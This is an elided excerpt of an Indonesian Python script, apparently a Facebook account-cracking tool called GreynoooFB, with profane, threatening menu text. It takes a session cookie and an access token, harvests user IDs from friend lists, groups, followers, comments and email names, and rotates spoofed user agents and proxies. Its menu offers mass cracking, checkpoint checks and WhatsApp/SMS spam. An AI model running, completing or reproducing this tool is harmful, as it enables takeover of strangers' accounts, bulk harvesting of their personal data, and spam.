...
try:
	...
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari GreynoooXD');exit()
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 10;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Infinix NOTE 2 LTE Build/LMY47D)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/101.0.4951.54'
...
for brayen in range(10000):
    ...
    u1 = f"Mozilla/5.0 (Linux; Android 10; Infinix NOTE 2 LTE Build/LMY47D) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/101.0.4951.54 Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android 11; RMX2072) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 0PR/75.1.3978.72329"
    u3 = f"Mozilla/5.0 (Linux; Android 11; RMX3581 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36"
    u4 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
    u5 = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
...
[bold green]                LU KAYAK KONTOL BERWANA
[bold green]                MERAH, KUNING, HIJAU, BIRU                                                                                                         
...
def login123():
	...
	bryn = input(f' [+] Pilih Menu, Gak Pilih Gw Bunuh Lu : ')
	if bryn in ['1','01']:
		login_lagi334()
	elif bryn in ['2','02']:
		lainnya()
		...
		print(' [+] Cuma Disuruh Pilih Susah Amat Kontol ')
		time.sleep(5)
		exit()
...
def login_lagi334():
	try:
		cetak(nel('Disarankan Menggunakan Kukis Yang Masih Baru Diambil Dari Pabriknya',width=90,style=f"bold white"))
		your_cookies = input(' [+] Masukkin Kukisnya Lu Gak Masukkin Gw Tonjok Lo : ')
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n [+] Login Berhasil/Valid Semoga Dapat CP Wkwkwk | python GreynoooFB.py");followdong()
			except Exception as e:
				print(" [+] Kukisnya Mokad Babi, Asu, Kontol")
...
def followdong():
	try:
		...
		print(' [+] Kukisnya Busuk Kayak Ketiak Elu ')
		time.sleep(5)
		login()
...
def menu(my_name,my_id):
	...
	cetak(panel(f"[bold white]Memek, Asu, Babi, Anjing, Setan, Monyet, Tai, Tadi Laso, Pepek, Kontol, Fucel",width=90,title=f"[bold green]Thanks To",style=f"bold white"))
	cetak(panel(f"[bold white][[bold cyan]01[bold white]] Crack Dari Pertemanan     [bold white][[bold cyan]06[bold white]] Crack Dari Nama[bold white]      [[bold cyan]11[bold white]] Get Headers      \n[bold white][[bold cyan]02[bold white]] Crack Massal      [bold white][[bold cyan]07[bold white]] Crack Dari Pengikut     [[bold cyan]12[bold white]] Spam WA      \n[bold white][[bold cyan]03[bold white]] Crack Dari Grup      [[bold cyan]08[bold white]] Crack Dari Komentar       [bold white][[bold cyan]13[bold white]] Spam Sms \n[bold white][[bold cyan]04[bold white]] Crack Dari Email       [bold white][[bold cyan]09[bold white]] Cek Opsi CP [bold white]   [[bold cyan]14[bold white]] Dump Idz \n[bold white][[bold cyan]05[bold white]] Crack Dari File       [bold white][[bold cyan]10[bold white]] [bold white]Cek Hasil Crack [bold white]      [[bold cyan]15[bold white]] [bold red]Hapus Kukis",width=90,title=f"[bold green]List Menu",style=f"bold white"))
	...
	if ____greynooo____xd____ in ['1','01']:
		greynooo_dump()
		...
		dumpidz()
	elif _____greynooo___xd____ in ['instagram','Instagram']:
		loginKukis()
	elif _____greynooo___xd____ in ['15']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f' [+] {m}Berhasil Keluar+Hapus Kukis')
		time.sleep(5)
		login()
	else:
		print(' [+] Cuma Disuruh Pilih Susah Amat Kontol ')
		exit()
def error():
	print(f' [+] Fitur Masih Diperbaiki Sabar Ya Ngentod ')
	time.sleep(4)
...
def komen():
	try:
		...
		print(' [+] Kukisnya Busuk Kayak Ketik Elu ')
		time.sleep(5)
		login()
	cetak(panel(f"Pastikan Akun Target Yang Publik Jangan Yang Privasi Kontol",width=90,padding=(0,4),style=f"bold white"))
	ide = input(f' [+] Masukkin Idz Postingan Kalau Enggak Gw Tonjok Lo : ')
	get_komen('https://m.facebook.com/'+ide,cokies)
	setting()
	if len(id)==0:
		print(f" [+] Gagal Dump Idz, Sepertinya Akun Privasi")
		time.sleep(3);exit()
...
def dumpid():
	...
	try:
		...
		coki = {"cookie":cookie}
		smpn20 = requests.get('https://mbasic.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(barelang,token),cookies=coki).json()
		...
		os.remove(gajahmada)
		print(f" [+] Gagal Dump Idz, Sepertinya Idz Tidak Ada")
		exit()
#-----------------[ CRACK GRUP ]-----------------# 
def crack_group():
	try:
		...
		time.sleep(5)
		login()
	cetak(nel(' Pastikan Idz Grup Bersifat Publik , Mohon Sabar Ya Asu  Dump Id Grup Sangat Slow Kayak Tangan Elu Kalau Main Fanny',width=90,style=f"bold white"))
...
def kocak(url,cokies):
	...
	if str(judul) == 'Use basic mode':
		print('\n [+] Kukis Sedang Dalam Mode Free');exit()
	if str(judul) == 'Epsilon':
		print('\n [+] Kukis Tidak Dapat Mengakses Grup');exit()
	if str(judul) == 'Kesalahan Sepertinya Nih Sc Kemasukkan Tikus':
		print('\n [+] Kukis Yang Anda Masukan Salah, Masukkin Yang Benar Laso');exit()
...
def pengikut():
	try:
		...
		print(' [+] Kukisnya Dah Busuk Kayak Ketiak Elu ')
		time.sleep(5)
		login()
	ses = requests.Session()
...
def dump_followers(link, cookie):
	try:
		...
		if "Lihat Selengkapnya" in url:
			dump_pengikut("https://mbasic.facebook.com"+parser(url, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), cookie)
	except:pass
#----------------------[ MENU CRACK LAINNYA ]----------------------#
def lainnya():
	cetak(panel(f"[[bold cyan]01[bold white]] Crack Username                   [[bold cyan]03[bold white]] Crack File \n[[bold cyan]02[bold white]] Crack Pengikut                  [[bold cyan]04[bold white]] Crack Email ",width=90,title=f"[bold green]Menu Crack",padding=(0,8),style=f"bold white"))
	bray = input(f' [+] Pilih Menu Crack Kalau Elu Nggak Pilih Gw tonjok Lu : ')
	if bray in(''):
		print(' [+] Cuma Disuruh Pilih Susah Amat Kontol ');exit()
	if bray in('1','01'):
		crack_nama()
	elif bray in('2','02'):
		pengikut()
...
def crack_nama():
	...
	cetak(panel(f"    Crack Nama, Satu Nama Yang Ingin Di Crack Setara Dengan 3.000 Nama",width=90,padding=(0,2),style=f"bold white"))
	nam = console.input(f' [+] Masukan Nama Kalau Enggak Gw Tonjok Lo : ').split(",")
	for ser in nam:		
...
def crack_email():
	...
	global ok , cp
	cetak(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Meki, Rimon ,Timo, Erna',width=90,padding=(0,5),style=f"bold white"))
	nama = console.input(f' [+] Masukan Nama Target : ')
	if ',' in str(nama):
		print(f" [+] Cuma Disuruh Masukkin Nama Susah Amat Kontol")
		time.sleep(3);exit()
	cetak(nel(f'Masukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold white"))
	doma = console.input(f' [+] Masukan Nama Domain Kalau Enggak Gw Tonjok Lo : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f" [+] Cuma Disuruh Madukkin Domain Susah Amat Kontol")
		time.sleep(3);exit()
...
def crack_file():
	try:vin = os.listdir('/sdcard/DUMP-FILE/')
		...
		exit()
	if len(vin)==0:
		print(' [+] Kamu Tidak Memiliki File Dump, Buat Dulu Sana ')
		time.sleep(2)
		exit()
	else:
		cih = 0
...
def brayen_dump():
	...
	try:
		...
		print(' [+] Jaringan Lu Jelek Anjing')
		exit()
	except (KeyError,IOError):
		print(' [+] Pertemanan Tidak Publik Atau Kukis Dan Tokek Anda Busuk Kayak Ketiak Elu')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
	...
	for userr in uid:
		try:
			col = ses.get('https://mbasic.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
	...
	try:
		...
		print(f' [+] {k} Pertemanan Tidak Publik ')
		time.sleep(3)
		exit()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print('')
	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack Idz Tua Ke Mudah [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Idz Mudah Ke Tua [[bold green]Recommended[bold white]][/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Idz Acak [[bold green]Very Recommended[bold white]][/]',width=90,padding=(0,8),title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
	...
	if hu in ['1','01']:
		...
		print(' [+] Cumah Disuruh Pilih Susah Amat Kontol ')
		exit()
	urut = []
